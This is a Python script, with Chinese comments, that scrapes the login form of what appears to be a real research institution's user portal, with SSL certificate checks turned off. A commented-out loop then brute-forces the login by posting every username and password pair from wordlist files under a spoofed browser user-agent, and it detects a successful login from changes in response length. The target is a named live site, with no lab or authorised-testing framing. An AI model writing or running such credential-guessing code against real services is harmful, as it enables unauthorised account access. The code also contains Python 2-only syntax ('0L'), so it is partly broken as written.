import requests
from bs4 import BeautifulSoup

url = 'https://user.ssrf.ac.cn/proposals/a/login'
# 发送 GET 请求获取登录页面内容
# ，verify=False 表示不验证 SSL 证书
res = requests.get(url, verify=False).text
# 使用 BeautifulSoup 解析获取到的 HTML 内容
soup = BeautifulSoup(res, 'html.parser')

# 查找表单（form 标签）的 action 属性，这个属性通常指示了表单提交的目标 URL
action = soup.find('form').get('action')
# 如果 action 最后是一个斜杠（/），去除它
if action[-1] == '/':
    action = action[:-1]
# 将 URL 拆分为列表，替换最后一部分为 action，重新拼接成完整 URL
url1 = url.split('/')
# 从第二位取，删除开头/
action = action[1:]
# 将需要替换的部分替换，列表后3个元素替换为1个元素
url1[-3:] = [action]
login_url = '/'.join(url1)
print(login_url)
# all_input = soup.find_all('input')
# uname = ''
# pwd = ''
# for i in all_input:
#     if i.get('name').find('u') == 0:
#         uname = i.get('name')
#     if i.get('name').find('p') == 0:
#         pwd = i.get('name')
# num = 0L
# res_count = 0
# for u in open('users.txt', 'r').readlines():
#     u = u.replace('\n', '')
#     for p in open('pwd.txt', 'r').readlines():
#         p = p.replace('\n', '')
#         head = {
#             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
#         }
#         payload = {
#             uname: u,
#             pwd: p
#         }
#         login_res = requests.post(url=login_url, data=payload).text
#         print(login_res)
#         if num == 0:
#             res_count = len(login_res)
#             num = num + 1
#         if len(login_res) > res_count + 5 or len(login_res) < res_count:
#             print(u, p)
#             break
